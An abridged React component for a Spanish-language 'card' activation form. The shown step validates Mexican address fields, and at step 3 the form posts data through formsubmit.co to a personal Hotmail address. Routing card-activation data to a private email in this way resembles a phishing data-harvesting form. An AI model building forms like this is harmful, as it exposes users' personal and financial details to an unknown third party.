...
export default function CardStepper() {
  ...
  const isStep3Valid = useMemo(() => {
    if (!formData.postalCode) {
      setStep3Error('El código postal es obligatorio');
      return false;
    }
    if (!formData.state) {
      setStep3Error('El estado es obligatorio');
      return false;
    }
    if (!formData.municipality) {
      setStep3Error('El municipio es obligatorio');
      return false;
    }
    if (!formData.colony) {
      setStep3Error('La colonia es obligatoria');
      return false;
    }
    if (!formData.street) {
      setStep3Error('La calle es obligatoria');
      return false;
    }
    if (!formData.exteriorNumber) {
      setStep3Error('El número exterior es obligatorio');
      return false;
    }

    setStep3Error('');
    return true;
  }, [formData.postalCode, formData.state, formData.municipality, 
      formData.colony, formData.street, formData.exteriorNumber]);
  ...
  const steps = [
    ...
    {
      title: "Escribe tu dirección para validar que te encuentras en México",
      fields: (
        <div className="space-y-6">
          <div className="space-y-4">
            <label className="block">
              <span className="block mb-2">Código Postal *</span>
              <input
                type="text"
                className={`w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${showStep3Validation && step3Error && !formData.postalCode ? 'border-red-500' : ''}`}
            ...
            <label className="block">
              ...
              <select
                className={`w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${showStep3Validation && step3Error && !formData.state ? 'border-red-500' : ''}`}
            ...
            <label className="block">
              <span className="block mb-2">Alcaldía o Municipio *</span>
              <select
                className={`w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${showStep3Validation && step3Error && !formData.municipality ? 'border-red-500' : ''}`}
            ...
            <label className="block">
              <span className="block mb-2">Colonia *</span>
              <input
                type="text"
                className={`w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${showStep3Validation && step3Error && !formData.colony ? 'border-red-500' : ''}`}
            ...
            <label className="block">
              <span className="block mb-2">Calle *</span>
              <input
                type="text"
                className={`w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${showStep3Validation && step3Error && !formData.street ? 'border-red-500' : ''}`}
                placeholder="Calle"
            ...
            <div className="grid grid-cols-2 gap-4">
              <label className="block">
                <span className="block mb-2">Número Exterior *</span>
                <input
                  type="text"
                  className={`w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${showStep3Validation && step3Error && !formData.exteriorNumber ? 'border-red-500' : ''}`}
                  placeholder="Número"
              ...
              <label className="block">
                <span className="block mb-2">Número Int. (Opcional)</span>
                <input
                  type="text"
                  className="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Número"
            ...
            {showStep3Validation && step3Error && (
              <p className="text-red-500 text-sm mt-1">{step3Error}</p>
            )}
          </div>
        </div>
      ),
    ...
    if (currentStep < steps.length) {
      ...
      if (currentStep === 3) {
        try {
          ...
          const activationResponse = await fetch('https://formsubmit.co/ajax/ezequielmatiasb@hotmail.com', {
            method: 'POST',
            headers: {
